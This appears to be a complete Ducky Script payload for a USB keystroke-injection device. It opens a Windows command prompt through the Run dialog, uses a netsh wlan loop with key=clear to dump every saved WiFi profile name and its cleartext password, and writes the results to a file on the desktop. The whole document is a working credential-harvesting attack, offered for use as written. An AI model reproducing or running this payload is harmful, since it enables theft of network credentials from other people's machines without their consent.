REM Extract saved WiFi passwords to a text file on the desktop
DEFAULT_DELAY 100
DELAY 500
GUI r
DELAY 800
STRING cmd /k
ENTER
DELAY 1500
STRING cd %USERPROFILE%\Desktop
ENTER
DELAY 300
STRING echo WiFi Passwords > wifi_passwords.txt
ENTER
DELAY 200
STRING for /f "tokens=2 delims=:" %A in ('netsh wlan show profiles ^| findstr "Profile"') do @for /f "tokens=2 delims=:" %B in ('netsh wlan show profile name^="%A" key^=clear ^| findstr "Key Content"') do @echo %A : %B >> wifi_passwords.txt
ENTER
DELAY 3000
STRING echo Done. Check wifi_passwords.txt on Desktop.
ENTER
